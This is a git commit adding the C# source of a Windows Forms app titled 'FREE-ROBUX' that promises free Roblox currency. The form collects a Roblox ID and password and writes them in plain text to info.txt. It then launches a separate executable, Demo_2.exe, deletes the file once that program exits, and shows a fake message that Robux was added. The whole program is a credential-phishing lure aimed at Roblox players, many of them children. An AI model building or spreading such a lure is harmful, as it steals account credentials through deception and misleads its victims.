c197f3d5783e563703c5ed2c288247e0dd9505bd
PlayBoi_Sanz <101702658+WhiteHole00@users.noreply.github.com>
2024-04-14 20:08:26 +0900

    Add files via upload

---
+++ Demo/Form1.Designer.cs
@@ -0,0 +1,143 @@
+﻿
+namespace Demo
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 필수 디자이너 변수입니다.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 사용 중인 모든 리소스를 정리합니다.
+        /// </summary>
+        /// <param name="disposing">관리되는 리소스를 삭제해야 하면 true이고, 그렇지 않으면 false입니다.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form 디자이너에서 생성한 코드
+
+        /// <summary>
+        /// 디자이너 지원에 필요한 메서드입니다. 
+        /// 이 메서드의 내용을 코드 편집기로 수정하지 마세요.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Segoe UI Symbol", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(23, 186);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(205, 30);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "WANTED ROBUX : ";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Font = new System.Drawing.Font("Segoe UI Historic", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox1.Location = new System.Drawing.Point(224, 195);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(183, 21);
+            this.textBox1.TabIndex = 1;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Segoe UI Symbol", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.Location = new System.Drawing.Point(23, 87);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(141, 30);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "ROBLOX ID :";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Segoe UI Symbol", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.Location = new System.Drawing.Point(23, 132);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(159, 30);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "ROBLOX PW : ";
+            // 
+            // textBox2
+            // 
+            this.textBox2.Font = new System.Drawing.Font("Segoe UI Semibold", 11.25F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox2.Location = new System.Drawing.Point(188, 141);
+            this.textBox2.Multiline = true;
+            this.textBox2.Name = "textBox2";
+            this.textBox2.PasswordChar = '•';
+            this.textBox2.Size = new System.Drawing.Size(183, 21);
+            this.textBox2.TabIndex = 4;
+            // 
+            // textBox3
+            // 
+            this.textBox3.Font = new System.Drawing.Font("Segoe UI Historic", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox3.Location = new System.Drawing.Point(188, 96);
+            this.textBox3.Multiline = true;
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(183, 21);
+            this.textBox3.TabIndex = 5;
+            // 
+            // button1
+            // 
+            this.button1.Font = new System.Drawing.Font("Segoe UI Symbol", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.Location = new System.Drawing.Point(106, 239);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(243, 51);
+            this.button1.TabIndex = 6;
+            this.button1.Text = "GET ROBUX";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(465, 340);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "FREE-ROBUX";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Button button1;
+    }
+}
+
---
+++ Demo/Form1.cs
@@ -0,0 +1,95 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+namespace Demo
+{
+    public partial class Form1 : MetroFramework.Forms.MetroForm
+    {
+
+        string while_ = "not_working";
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+
+            if (textBox1.Text ==  "100000")
+            {
+                MessageBox.Show("로벅스는 최대 100000개 이하로 입력 가능합니다.", "FREE ROBUX 2024",MessageBoxButtons.OK,MessageBoxIcon.Error);
+            }
+            else if (textBox1.Text == "")
+            {
+                MessageBox.Show("로벅스를 적어주세요!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            else if (textBox2.Text == "")
+            {
+                MessageBox.Show("비밀번호를 적어주세요!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+            }
+            else if (textBox3.Text == "")
+            {
+                MessageBox.Show("아이디를 적어주세요!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            else
+            {
+                if (while_ == "not_working")
+                {
+                    MessageBox.Show("로벅스 얻기 프로그램을 시작합니다", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                    using (StreamWriter w = new StreamWriter("info.txt"))
+                    {
+                        w.WriteLine($"{textBox3.Text}:{textBox2.Text}:{textBox1.Text}");
+                    }
+                    while_ = "working";
+                    try
+                    {
+                        ProcessStartInfo process = new ProcessStartInfo(); 
+
+                        process.FileName = @".\assests\Demo_2.exe";
+
+                        Process pr =  Process.Start(process);
+
+                        pr.EnableRaisingEvents = true;
+
+                        pr.Exited += (s, EventArgs) =>
+                        {
+                            File.Delete("info.txt");
+                            MessageBox.Show($"{textBox3.Text}님 계정의 로벅스가 성공적으로 추가 되었습니다!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+                            while_ = "not_working";
+                        };
+                    } catch
+                    {
+                        MessageBox.Show("Demo_2.exe 라는 파일이 존재 하지 않습니다!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        while_ = "not_working";
+                    }
+
+                    
+                }
+                else if (while_ == "working")
+                {
+                    MessageBox.Show("작동중 입니다. 끝날때 까지 기다려 주세요!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void Pr_Exited(object sender, EventArgs e)
+        {
+            throw new NotImplementedException();
+        }
+    }
+}
